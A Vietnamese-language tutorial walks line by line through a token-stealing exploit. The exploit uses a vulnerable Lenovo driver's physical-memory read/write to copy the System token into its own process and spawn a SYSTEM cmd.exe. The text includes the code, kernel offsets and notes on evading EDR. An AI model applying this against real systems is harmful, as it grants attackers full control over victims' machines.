# 02 — Token Stealing (DKOM)

**File:** `02_token_steal.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Physical memory read + write  
**Output:** Spawn `cmd.exe` với token của NT AUTHORITY\SYSTEM

---

## Mục tiêu

Copy token của process System (PID=4) vào token của process hiện tại → mọi process con tạo ra sau đó sẽ inherit token SYSTEM → có full privilege.

---

## Lý thuyết nền

### Token trong Windows

Mỗi process có một `_TOKEN` object trong kernel, trỏ bởi field `Token` trong `_EPROCESS`. Token chứa Security Identifier (SID), privileges, group membership — đây là thứ kernel kiểm tra khi process cố làm gì đó đặc quyền.

**`_EX_FAST_REF`**: Token không được lưu trực tiếp bằng pointer thông thường mà dùng `EX_FAST_REF` — một optimization của Windows kernel:

```
bits [63:4] = pointer thực đến TOKEN object (16-byte aligned)
bits  [3:0] = reference count (kernel tự quản lý)
```

Ta copy **toàn bộ 8 bytes** (cả ref count) của System token sang self token. Điều này hoạt động vì kernel dereference bits [63:4] khi cần check privilege, và System TOKEN object luôn hợp lệ.

### DKOM (Direct Kernel Object Manipulation)

Thay vì gọi syscall `NtSetInformationProcess` (bị audit, bị EDR hook), ta **trực tiếp ghi vào physical memory** của EPROCESS. Không có kernel code nào được thực thi — đây là data-only attack thuần túy.

### _EPROCESS offsets (x64, Win10 19041 → Win11 26100+)

| Field | Offset | Loại |
|-------|--------|------|
| `DirectoryTableBase` (CR3) | `+0x028` | `UINT64` |
| `UniqueProcessId` | `+0x440` | `ULONG_PTR` |
| `ActiveProcessLinks` | `+0x448` | `LIST_ENTRY` |
| `Token` | `+0x4B8` | `EX_FAST_REF` (8 bytes) |
| `ImageFileName` | `+0x5A8` | `char[15]` |

---

## IOCTL Write Layout

```cpp
#pragma pack(push, 1)
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)
```

Driver expect:
- `PA`: physical address cần ghi
- `OT`: OperationType = 1 (write)
- `AS`: AccessSize = 8 (QWORD)
- `Data`: giá trị cần ghi (8 bytes)

Total input = 8 + 4 + 4 + 8 = 24 bytes.

---

## Giải thích code từng dòng

### FindEprocess()

```cpp
static uint64_t FindEprocess(DWORD targetPid, const char *targetName)
{
    uint64_t ram_top = PhysRamTop();

    // Offset lớn nhất cần đọc = ImageFileName + 8 bytes buffer
    DWORD minTrail = g_off.ImageFileName + 8;  // = 0x5A8 + 8 = 0x5B0

    // Allocate 1MB buffer để đọc từng chunk
    auto *chunk = (uint8_t *)VirtualAlloc(nullptr, SCAN_CHUNK,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Scan theo từng chunk 1MB (1 << 20). Lý do không scan từng 4KB: overhead của IOCTL mỗi lần call rất cao, batch 1MB vào buffer local sẽ nhanh hơn nhiều.

```cpp
    for (uint64_t pa = 0x100000ULL; pa < ram_top && !result; pa += SCAN_CHUNK) {
        if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue; // skip PCI MMIO

        // Đọc từng 4KB page riêng lẻ (driver limit 4096 bytes/IOCTL)
        bool any_ok = false;
        for (DWORD pg = 0; pg < readLen; pg += 0x1000) {
            DWORD pl = (readLen - pg < 0x1000u) ? (readLen - pg) : 0x1000u;
            if (PhysRead(pa + pg, chunk + pg, pl)) any_ok = true;
            else memset(chunk + pg, 0, pl);  // page không đọc được → zero nó
        }
        if (!any_ok) continue;  // toàn bộ 1MB không đọc được → skip
```

Tại sao đọc từng 4KB? Vì `PhysRead()` có guard `if (len > 4096) return false;` — driver không cho đọc hơn 4096 bytes một lần. Ta phải loop.

```cpp
        for (DWORD off = 0; off + minTrail <= readLen; off += SCAN_STEP) {
            // SCAN_STEP = 8: EPROCESS được align 8 bytes

            // Check 1: UniqueProcessId == targetPid
            ULONG_PTR pid_val = *(ULONG_PTR *)(chunk + off + g_off.UniqueProcessId);
            if ((DWORD)pid_val != targetPid) continue;
            if (pid_val >> 32) continue;  // PID chỉ là 32-bit, high 32 bits phải 0
```

`(DWORD)pid_val != targetPid`: cast xuống 32-bit để so sánh PID.  
`pid_val >> 32`: kiểm tra high 32 bits là 0 — tránh false positive khi một UINT64 ngẫu nhiên có low 32 bits trùng PID.

```cpp
            // Check 2: ImageFileName bắt đầu bằng targetName
            const char *fname = (const char *)(chunk + off + g_off.ImageFileName);
            size_t nameLen = strlen(targetName);
            if (_strnicmp(fname, targetName, nameLen) != 0) continue;

            result = pa + off;  // physical address của EPROCESS base
```

`_strnicmp`: so sánh case-insensitive. Dùng `strncmp` prefix (không cần full match) vì ImageFileName có thể truncate tên dài. Ví dụ: "02_token_ste" (15 chars max).

### Main flow

```cpp
// Step 1: tìm System EPROCESS
uint64_t system_eproc_pa = FindEprocess(4, "System");

// Đọc token của System
uint64_t system_token = 0;
PhysReadU64(system_eproc_pa + g_off.Token, &system_token);
// g_off.Token = 0x4B8
```

```cpp
// Step 2: tìm self EPROCESS
DWORD myPid = GetCurrentProcessId();
// Lấy tên exe (chỉ lấy stem, không có extension và path)
char myStem[16] = {};
strncpy_s(myStem, sizeof(myStem), myBaseName, 15);
if (char *dot = strrchr(myStem, '.')) *dot = '\0'; // bỏ ".exe"

uint64_t self_eproc_pa = FindEprocess(myPid, myStem);
```

ImageFileName trong EPROCESS lưu tên file **không có path**, và có thể có hoặc không có extension tùy build. Ta strip extension để match an toàn hơn.

```cpp
// Step 3: save original token
uint64_t orig_token = 0;
PhysReadU64(self_eproc_pa + g_off.Token, &orig_token);

// Step 4: ghi System token vào self
PhysWriteU64(self_eproc_pa + g_off.Token, system_token);

// Readback verify
uint64_t token_after = 0;
PhysReadU64(self_eproc_pa + g_off.Token, &token_after);
```

Sau khi ghi, ta đọc lại để verify. Nếu mismatch → driver có thể buffer write và không commit ngay (hiếm, nhưng có thể xảy ra với write-combined memory).

```cpp
// Step 5: spawn SYSTEM cmd.exe
STARTUPINFOA si = {};
si.cb = sizeof(si);
PROCESS_INFORMATION pi = {};

BOOL ok = CreateProcessA(
    nullptr,
    (LPSTR)"cmd.exe",
    nullptr, nullptr, FALSE,
    CREATE_NEW_CONSOLE,   // tạo cửa sổ mới
    nullptr, nullptr,
    &si, &pi);
```

`CreateProcess` fork từ process hiện tại. Process mới **inherit token của parent** (đã bị overwrite thành SYSTEM). Kết quả: cmd.exe chạy với token SYSTEM.

Trong cmd.exe mới, gõ `whoami` → in ra `nt authority\system`.

---

## Tại sao không restore token?

```cpp
// Note: we do NOT restore the token here — restoring it would downgrade our
// privileges before the child process is fully initialised.
// The token will be cleaned up when this process exits.
```

Nếu restore trước khi cmd.exe fully khởi tạo, child process có thể bị downgrade. Khi process cha exit, kernel clean up EPROCESS → không cần lo về memory leak.

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| PatchGuard | Không check Token field trong EPROCESS |
| Race condition | Low — scan xong thì ghi ngay, ít khả năng EPROCESS bị move |
| BSOD risk | Rất thấp — System TOKEN object luôn hợp lệ trong suốt session |
| EDR detection | Detect được qua kernel callbacks nếu Ps* callbacks còn hoạt động |

---

## Tóm tắt flow

```
FindEprocess(PID=4, "System") → system_eproc_pa
    ↓ read
System.Token (EX_FAST_REF) = 0xFFFF...xxxxx0F
    ↓
FindEprocess(myPid, myName) → self_eproc_pa
    ↓ write
self_eproc_pa + 0x4B8 = system_token
    ↓
CreateProcess("cmd.exe") → inherits SYSTEM token
    ↓
whoami → nt authority\system
```
